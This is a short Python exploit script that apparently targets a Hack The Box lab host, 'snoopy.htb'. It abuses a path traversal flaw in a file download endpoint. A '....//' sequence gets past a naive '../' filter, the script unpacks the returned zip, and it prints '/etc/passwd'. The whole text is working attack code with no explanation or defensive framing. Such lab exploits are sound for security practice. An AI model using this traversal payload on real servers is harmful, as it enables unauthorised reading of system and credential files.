#!/usr/bin/python3
import requests
import io
import zipfile

def download(file):
    url = f'http://snoopy.htb/download?file=....//....//....//....//....//{file}'
    r = requests.get(url)  # Corrected the typo here
    if len(r.content) == 0:
        return None
    zip_content = io.BytesIO(r.content)
    with zipfile.ZipFile(zip_content) as z:
        content = z.read(f"press_package/{file}")
    return content

print(download("/etc/passwd").decode())

